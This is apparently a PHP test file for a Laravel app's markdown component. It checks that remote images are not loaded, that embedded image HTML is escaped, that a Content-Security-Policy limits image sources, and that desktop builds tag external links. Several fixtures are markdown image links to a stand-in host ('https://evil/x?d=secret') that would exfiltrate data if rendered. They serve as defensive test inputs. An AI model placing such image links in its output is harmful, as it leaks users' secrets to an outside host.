<?php

use App\Client\MarkdownHtml;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Facades\URL;

it('does not load a remote image containing stolen data', function () {
    $html = Blade::render('<x-client.markdown :text="$text" />', [
        'text' => '![x](https://evil/x?d=secret)',
    ]);

    expect($html)->not->toContain('<img', 'https://evil/x?d=secret')->toContain('<p>x</p>');
});

it('renders image alt content without loading images', function (string $markdown) {
    $html = Blade::render('<x-client.markdown :text="$text" />', ['text' => $markdown]);

    expect($html)->not->toContain('<img', 'https://evil/x?d=secret')
        ->toContain('image description');
})->with([
    'inline' => '![image description](https://evil/x?d=secret)',
    'reference' => "![image description][remote]\n\n[remote]: https://evil/x?d=secret",
    'local' => '![image description](/image.png)',
    'nested' => '[![image description](https://evil/x?d=secret)](/safe)',
]);

it('escapes raw image HTML and unsafe alt content', function () {
    $html = Blade::render('<x-client.markdown :text="$text" />', [
        'text' => '![<img src="https://evil/x?d=secret">](https://evil/other)',
    ]);

    expect($html)->not->toContain('<img')->toContain('&lt;img');
});

it('restricts image sources on client web pages', function () {
    connectClientWeb();

    $this->get(route('connect'))->assertOk()
        ->assertHeader('Content-Security-Policy', "img-src 'self' data:");
});

it('does not tag markdown links for the browser client', function () {
    config(['nativephp-internal.running' => false]);

    $html = Blade::render('<x-client.markdown :text="$text" />', [
        'text' => 'See [docs](https://example.com/docs).',
    ]);

    expect($html)->not->toContain('data-native-external-link');
});

it('tags external markdown links in the desktop app', function () {
    config(['nativephp-internal.running' => true]);
    URL::forceRootUrl('http://127.0.0.1:8000');

    $html = Blade::render('<x-client.markdown :text="$text" />', [
        'text' => 'Off-site [docs](https://example.com/docs) and local [tasks](/intents).',
    ]);

    expect($html)
        ->toContain('data-native-external-link')
        ->toContain('href="https://example.com/docs"')
        ->and($html)->toMatch('/href="\/intents"/')
        ->and($html)->not->toMatch('/data-native-external-link[^>]*href="\/intents"/');
});

it('exposes desktop external-link handling attributes on the client layout', function () {
    config(['nativephp-internal.running' => true]);

    $html = view('layouts.client', ['slot' => ''])->render();

    expect($html)
        ->toContain('data-native-desktop')
        ->toContain('data-native-open-external-url="'.route('native.open-external').'"')
        ->toContain('name="csrf-token"');
});

it('keeps an external link\'s query and quotes intact in the desktop app', function () {
    config(['nativephp-internal.running' => true]);
    URL::forceRootUrl('http://127.0.0.1:8000');

    $html = MarkdownHtml::render("[search](https://a.test/?a=1&b=2) and [it's](https://b.test/it's)");

    expect($html)->toContain('href="https://a.test/?a=1&amp;b=2" data-native-external-link')
        ->not->toContain('&amp;amp;')
        ->toContain('href="https://b.test/it\'s" data-native-external-link');
});
